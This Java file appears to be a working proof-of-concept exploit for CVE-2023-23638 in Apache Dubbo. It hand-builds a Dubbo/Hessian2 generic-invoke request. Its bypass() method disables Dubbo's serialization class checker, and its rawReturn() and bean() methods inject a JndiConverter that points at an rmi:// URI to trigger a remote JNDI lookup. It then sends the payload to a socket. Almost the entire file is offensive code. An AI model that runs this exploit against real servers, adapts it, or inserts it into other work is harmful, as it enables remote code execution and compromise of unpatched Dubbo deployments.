package org.example;

import org.apache.dubbo.common.beanutil.JavaBeanDescriptor;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;
import org.apache.dubbo.common.utils.ConcurrentHashSet;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.util.HashMap;
import java.util.Properties;
import java.util.Random;

/**
 * @author Whoopsunix
 *
 * CVE-2023-23638
 */
public class CVE_2023_23638 {
    public static void main(String[] args) throws Exception {

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set request and serialization flag.
        header[2] = (byte) ((byte) 0x80 | 2);

        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);

        // set body
        out.writeUTF("2.7.21");
        out.writeUTF("org.example.api.DemoService");
        out.writeUTF("1.0");
        out.writeUTF("$invoke");
        out.writeUTF("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
        out.writeUTF("sayHello");
        out.writeObject(new String[]{"java.lang.String"});

        /**
         * Hessian
         * Step-1
         */
//        bypass(out);

        /**
         * Step-2
         */
//        rawReturn(out, "rmi://127.0.0.1:1099/3uqnbu");
//        bean(out, "rmi://127.0.0.1:1099/3uqnbu");

        out.flushBuffer();

        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

        Socket socket = new Socket("127.0.0.1", 12345);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }

    /**
     * hessian
     * @param out
     * @throws IOException
     */
    private static void bypass(Hessian2ObjectOutput out) throws IOException {
        HashMap<String, Object> instanceMap = new HashMap<>();
        instanceMap.put("class", "org.apache.dubbo.common.utils.SerializeClassChecker");
        instanceMap.put("OPEN_CHECK_CLASS", false);
//        instanceMap.put("CLASS_DESERIALIZE_BLOCKED_SET", new ConcurrentHashSet<>());
        HashMap<String, Object> scc = new HashMap<>();
        scc.put("class", "org.apache.dubbo.common.utils.SerializeClassChecker");
        scc.put("INSTANCE", instanceMap);
        out.writeObject(new Object[]{scc});

        HashMap<String, Object> map = new HashMap<>();
        map.put("generic", "raw.return");
        out.writeObject(map);
    }

    private static void rawReturn(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        HashMap<String, Object> jndi = new HashMap<>();
        jndi.put("class", "org.apache.xbean.propertyeditor.JndiConverter");
        jndi.put("asText", ldapUri);
        out.writeObject(new Object[]{jndi});

        HashMap<String, Object> map = new HashMap<>();
        map.put("generic", "raw.return");
        out.writeObject(map);
    }

    private static void bean(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        JavaBeanDescriptor javaBeanDescriptor = new JavaBeanDescriptor("org.apache.xbean.propertyeditor.JndiConverter", 7);
        javaBeanDescriptor.setProperty("asText", ldapUri);
        out.writeObject(new Object[]{javaBeanDescriptor});
        HashMap<String, Object> map = new HashMap<>();

        map.put("generic", "bean");
        out.writeObject(map);
    }
}
